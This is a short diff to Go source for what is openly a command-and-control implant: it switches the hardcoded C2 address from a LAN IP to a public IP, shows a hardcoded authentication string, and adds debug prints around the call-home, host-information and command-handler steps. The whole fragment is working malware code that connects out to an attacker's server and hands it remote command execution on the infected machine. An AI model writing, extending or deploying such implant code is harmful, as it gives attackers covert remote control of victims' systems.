@@ -48,6 +48,7 @@ func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
 }
 
 func reply2Auth(conn *net.Conn) {
+	fmt.Println("Sending Auth Message")
 	(*conn).Write([]byte("i_L0V_y0U_Ju5t1n_P3t3R\n"))
 }
 
@@ -294,7 +295,7 @@ func hostinfo(conn net.Conn) bool {
 }
 
 func main() {
-	c2Address := "192.168.0.102:1234" // Encrypt/decode at runtime in real use
+	c2Address := "89.43.33.169:1234" // Encrypt/decode at runtime in real use
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
@@ -303,7 +304,9 @@ func main() {
 	for !result {
 		conn, result = callHome(&c2Address, &attempts)
 	}
+	fmt.Println("CallHome Success")
 	if hostinfo(conn) {
+		fmt.Println("HostInfo Success")
 		go unifiedCommandHandler(&conn, &implantWD)
 	}
 	// Block main from exiting
